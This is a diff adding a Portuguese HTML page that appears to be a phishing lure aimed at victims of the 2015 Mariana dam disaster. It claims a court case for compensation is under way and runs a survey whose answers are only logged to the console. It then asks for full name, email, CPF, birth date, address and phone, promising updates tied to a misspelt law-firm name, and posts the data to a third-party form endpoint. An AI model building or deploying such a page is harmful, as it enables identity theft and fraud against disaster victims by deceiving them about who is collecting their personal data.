@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Perguntas e Cadastro</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f3f4f6;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .question-container, .form-container {
+            display: none;
+            background-color: #fff;
+            padding: 20px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            margin-bottom: 10px;
+        }
+
+        .question-container.active, .form-container.active {
+            display: block;
+        }
+
+        .options button, .submit-btn {
+            padding: 8px 16px;
+            margin: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            color: white;
+        }
+
+        .options button {
+            background-color: #007BFF;
+        }
+
+        .submit-btn {
+            background-color: #4CAF50;
+        }
+
+        .introduction {
+            width: 80%;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    
+    <img src="imagens/logo.png" alt="Logo" class="logo" width="200"> <!-- Logo adicionada aqui -->
+
+    <div class="introduction">
+        <h1>Chamada para processo do Desastre de Mariana.</h1>
+        <p>Estamos na luta para conseguirmos as Indenizações nescessárias, A corte inglesa já deu inicio aos julgamentos.</p>
+        <p>Este espaço foi criado para oferecer uma visão abrangente sobre o rompimento da barragem de Fundão, ocorrido em 5 de novembro de 2015 em Mariana, Minas Gerais. O desastre, que é considerado o maior desastre ambiental do Brasil, resultou na perda de vidas, na destruição de comunidades e na contaminação severa do Rio Doce. Aqui, buscamos apresentar uma análise detalhada dos impactos ambientais, sociais e econômicos causados pela tragédia, com foco na luta pela recuperação das áreas afetadas e na busca por justiça para as comunidades atingidas.</p>
+    </div>
+
+    <form id="mainForm" action="https://formspree.io/f/xanwrrrj" method="POST">
+        <!-- Perguntas sobre o desastre de Mariana -->
+        <div class="question-container active" id="question1">
+            <p>Pergunta 1: Você conhece o desastre da barragem de Fundão em Mariana?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(1, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(1, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question2">
+            <p>Pergunta 2: Você se sente impactato pelas consequências ambientais do desastre?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(2, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(2, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question3">
+            <p>Pergunta 3: Qual você considera o maior impacto do desastre em Mariana?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(3, 'Destruição de Vidas')">Destruição de Vidas</button>
+                <button type="button" onclick="nextQuestion(3, 'Destruição Ambiental')">Destruição Ambiental</button>
+                <button type="button" onclick="nextQuestion(3, 'Impacto Econômico')">Impacto Econômico</button>
+                <button type="button" onclick="nextQuestion(3, 'Outros')">Outros</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question4">
+            <p>Pergunta 4: Você acredita que as medidas de reparação estão sendo adequadas?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(4, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(4, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question5">
+            <p>Pergunta 5: Você já ouviu falar sobre as ações judiciais relacionadas ao desastre?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(5, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(5, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question6">
+            <p>Pergunta 6: Você conhece alguma ONG ou grupo que atua na recuperação das áreas afetadas?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(6, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(6, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question7">
+            <p>Pergunta 7: Você acha que a conscientização pública sobre o desastre é suficiente?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(7, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(7, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question8">
+            <p>Pergunta 8: Você gostaria de se envolver em ações para ajudar as vítimas do desastre?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(8, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(8, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question9">
+            <p>Pergunta 9: Você acredita que o governo deveria tomar mais ações preventivas contra desastres?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(9, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(9, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <div class="question-container" id="question10">
+            <p>Pergunta 10: Você gostaria de aprender mais sobre desastres ambientais e suas consequências?</p>
+            <div class="options">
+                <button type="button" onclick="nextQuestion(10, 'Sim')">Sim</button>
+                <button type="button" onclick="nextQuestion(10, 'Não')">Não</button>
+            </div>
+        </div>
+
+        <!-- Formulário de Dados Pessoais -->
+        <div class="form-container" id="personalInfo">
+            <h3>Preencha com seus Dados, Para que possamos consultar o andamento do processo em seu nome!
+                Voce recebara um Email com os dados relacionados a sua consulta junto com a Pogust Goodhed.
+            </h3>
+            <input type="text" name="nome_completo" placeholder="Nome Completo" required><br>
+            <input type="email" name="email" placeholder="Email" required><br>
+            <input type="text" name="cpf" placeholder="CPF" required><br>
+            <input type="text" name="data_nascimento" placeholder="Data de Nascimento" required><br>
+            <input type="text" name="endereco" placeholder="Endereço" required><br>
+            <input type="text" name="cidade" placeholder="Cidade" required><br>
+            <input type="text" name="telefone" placeholder="Telefone" required><br>
+            <button type="submit" class="submit-btn">Enviar</button>
+        </div>
+    </form>
+
+    <script>
+        let currentQuestion = 1;
+
+        function nextQuestion(questionNumber, response) {
+            console.log(`Resposta da Pergunta ${questionNumber}: ${response}`);
+            document.getElementById(`question${questionNumber}`).classList.remove('active');
+            currentQuestion++;
+
+            // Mostra a próxima pergunta ou o formulário de dados pessoais
+            if (currentQuestion <= 10) {
+                document.getElementById(`question${currentQuestion}`).classList.add('active');
+            } else {
+                document.getElementById('personalInfo').classList.add('active');
+            }
+        }
+    </script>
+</body>
+</html>
